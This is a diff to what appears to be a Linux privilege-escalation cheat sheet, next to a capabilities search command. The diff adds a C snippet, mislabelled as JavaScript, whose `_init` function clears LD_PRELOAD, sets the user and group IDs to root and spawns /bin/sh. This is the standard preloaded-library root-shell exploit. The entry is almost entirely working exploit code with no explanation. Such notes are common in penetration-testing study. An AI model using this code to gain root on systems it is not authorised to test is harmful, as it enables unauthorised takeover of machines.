@@ -219,11 +219,19 @@ Capabilities help manage privileges at a more granular level. For example, if th
 getcap -r / 2>/dev/null
 ```
 
-****
-
+**** Priv Esc with C Code
 
 ```JavaScript
-
+#include <stdio.h>
+#include <sys/types.h>
+#include <stdlib.h>
+#include <unistd.h>
+void _init() {
+	unsetenv("LD_PRELOAD");
+	setgid(0);
+	setuid(0);
+	system("/bin/sh");
+}
 ```
 
 ****
